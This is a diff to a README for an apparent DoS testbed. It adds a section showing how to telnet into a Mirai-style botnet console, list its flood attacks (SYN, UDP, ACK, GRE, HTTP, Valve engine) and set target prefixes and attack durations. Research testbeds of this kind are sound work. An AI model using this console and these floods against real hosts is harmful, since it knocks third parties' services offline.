@@ -57,6 +57,40 @@ python webcam_server.py
 ### Terminal 4    
 python ping_server.py
 ```
+### To instruct attack     
+```
+telnet [attacker IP address]
+```
+```
+[+] This is the Portable DoS Test Tool.
+[+] Command is here.
+[+] attack:[type target(s) time flags]
+[+] (If you use ? in attack command, you can check help.
+     Ex:[?],[udp ?],[udp 1.1.1.1 ?])
+[+] exit:[exit],[quit]
+[+] botcount:[botcount]
+root@botnet# ?
+Available attack list
+ack: ACK flood
+greip: GRE IP flood
+greeth: GRE Ethernet flood
+udpplain: UDP flood with less options. optimized for higher PPS
+http: HTTP flood
+udp: UDP flood
+vse: Valve source engine specific flood
+syn: SYN flood
+
+root@botnet# udp ?
+Comma delimited list of target prefixes
+Ex: 192.168.0.1
+Ex: 10.0.0.0/8
+Ex: 8.8.8.8,127.0.0.0/29
+
+root@botnet# udp 192.168.0.1 ?
+Duration of the attack, in seconds
+```
+Up to three duplicate attacks are possible    
+
 ## Installation    
 ### Elasticsearch Install
 [Elasticsearch](https://www.elastic.co/jp/products/elasticsearch)     
